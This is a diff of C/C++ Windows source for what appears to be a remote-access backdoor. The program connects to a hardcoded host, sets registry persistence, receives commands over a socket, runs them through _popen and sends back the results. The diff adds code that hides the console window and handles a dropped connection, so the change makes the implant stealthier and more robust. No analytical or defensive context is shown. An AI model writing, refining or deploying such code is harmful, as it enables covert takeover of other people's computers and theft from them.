@@ -11,7 +11,8 @@
 const char szHost[] = "192.168.1.140";
 
 int main(const int argc, const char* argv[]){
-	// === First ensure persistence:
+	// === Do some typical stuff, hide the console and do some registry editing
+    ShowWindow(GetConsoleWindow(), SW_HIDE); // Hide the window
 	HKEY hKey;
     LONG lResult = RegOpenKeyEx(
         HKEY_LOCAL_MACHINE,
@@ -66,7 +67,10 @@ int main(const int argc, const char* argv[]){
     char szBuffer[1024]; // A buffer to receive commands on
     while(1){
         ZeroMemory(&szBuffer, sizeof(szBuffer));
-        recv(sock, szBuffer, 1024, 0);
+        int bytes_received = recv(sock, szBuffer, 1024, 0);
+        if (bytes_received <= 0) {
+            break;
+        }
         printf("RECVCMD: %s\n", szBuffer);
         FILE* p = _popen(szBuffer, "r");
         char szCmdResultBuffer[4096];
@@ -78,7 +82,6 @@ int main(const int argc, const char* argv[]){
 		std::cout << "SNDRSLT: " << result << std::endl;
 		send(sock, result.c_str(), result.length(), 0);
 	}
-
     closesocket(sock);
     ExitProcess(EXIT_SUCCESS); // Like return, but the OS/kernel likes it a bit more - best practice
 }
